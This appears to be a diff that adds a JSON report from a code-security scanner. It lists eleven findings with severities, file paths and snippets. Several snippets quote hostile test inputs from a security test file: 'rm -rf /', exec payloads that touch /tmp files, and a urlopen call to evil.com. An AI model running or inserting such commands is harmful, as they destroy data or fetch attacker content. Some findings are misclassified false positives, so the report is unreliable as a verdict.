@@ -1,0 +1,124 @@
+{
+  "scan_summary": {
+    "files_scanned": 69,
+    "total_issues": 11,
+    "severity_distribution": {
+      "critical": 0,
+      "high": 7,
+      "medium": 4,
+      "low": 0
+    },
+    "issue_types": {
+      "path_traversal": 2,
+      "weak_crypto": 1,
+      "hardcoded_token": 2,
+      "command_injection": 4,
+      "config_secret": 1,
+      "vulnerable_dependency": 1
+    },
+    "scan_timestamp": "2025-08-04T21:36:51.213956"
+  },
+  "issues": [
+    {
+      "file_path": "security_scan.py",
+      "line_number": 260,
+      "issue_type": "path_traversal",
+      "severity": "medium",
+      "description": "Potential path traversal vulnerability",
+      "recommendation": "Validate and sanitize file paths",
+      "code_snippet": "if 'open(' in line and ('..' in line or 'user_input' in line or 'request.' in line):"
+    },
+    {
+      "file_path": "security_scan.py",
+      "line_number": 293,
+      "issue_type": "weak_crypto",
+      "severity": "medium",
+      "description": "Weak cryptographic algorithm: RC4 is insecure",
+      "recommendation": "Use strong, modern cryptographic algorithms",
+      "code_snippet": "(r'RC4', \"RC4 is insecure\"),"
+    },
+    {
+      "file_path": "scripts/automation/integration-setup.py",
+      "line_number": 292,
+      "issue_type": "hardcoded_token",
+      "severity": "high",
+      "description": "Potential hardcoded secret detected: hardcoded_token",
+      "recommendation": "Use environment variables or secure configuration management",
+      "code_snippet": "export GITHUB_TOKEN=\"your_github_token_here\""
+    },
+    {
+      "file_path": "scripts/automation/integration-setup.py",
+      "line_number": 302,
+      "issue_type": "hardcoded_token",
+      "severity": "high",
+      "description": "Potential hardcoded secret detected: hardcoded_token",
+      "recommendation": "Use environment variables or secure configuration management",
+      "code_snippet": "export CODECOV_TOKEN=\"your_codecov_token_here\""
+    },
+    {
+      "file_path": "tests/security/test_security_validation.py",
+      "line_number": 120,
+      "issue_type": "command_injection",
+      "severity": "high",
+      "description": "Potential command injection vulnerability",
+      "recommendation": "Sanitize input and avoid shell=True",
+      "code_snippet": "os.system(\"rm -rf /\")  # This should never execute"
+    },
+    {
+      "file_path": "tests/security/test_security_validation.py",
+      "line_number": 121,
+      "issue_type": "command_injection",
+      "severity": "high",
+      "description": "Potential command injection vulnerability",
+      "recommendation": "Sanitize input and avoid shell=True",
+      "code_snippet": "exec(\"__import__('os').system('touch /tmp/pwned')\")"
+    },
+    {
+      "file_path": "tests/security/test_security_validation.py",
+      "line_number": 122,
+      "issue_type": "command_injection",
+      "severity": "high",
+      "description": "Potential command injection vulnerability",
+      "recommendation": "Sanitize input and avoid shell=True",
+      "code_snippet": "eval(\"1+1\")  # Even benign eval should not execute"
+    },
+    {
+      "file_path": "tests/security/test_security_validation.py",
+      "line_number": 229,
+      "issue_type": "command_injection",
+      "severity": "high",
+      "description": "Potential command injection vulnerability",
+      "recommendation": "Sanitize input and avoid shell=True",
+      "code_snippet": "\"action\": \"exec('__import__(\\\"os\\\").system(\\\"touch /tmp/evil\\\")')\""
+    },
+    {
+      "file_path": "tests/security/test_security_validation.py",
+      "line_number": 296,
+      "issue_type": "path_traversal",
+      "severity": "medium",
+      "description": "Potential path traversal vulnerability",
+      "recommendation": "Validate and sanitize file paths",
+      "code_snippet": "urllib.request.urlopen(\"http://evil.com/key\")"
+    },
+    {
+      "file_path": "monitoring/alertmanager.yml",
+      "line_number": 7,
+      "issue_type": "config_secret",
+      "severity": "high",
+      "description": "Potential secret in configuration file",
+      "recommendation": "Use environment variables or secure vault",
+      "code_snippet": "smtp_auth_password: '${SMTP_PASSWORD}'"
+    },
+    {
+      "file_path": "requirements.txt",
+      "line_number": 4,
+      "issue_type": "vulnerable_dependency",
+      "severity": "medium",
+      "description": "Potentially vulnerable dependency: requests",
+      "recommendation": "Update to secure version. Security vulnerabilities in older versions",
+      "code_snippet": "requests>=2.28.0"
+    }
+  ],
+  "security_score": 10,
+  "pass_threshold": 85
+}
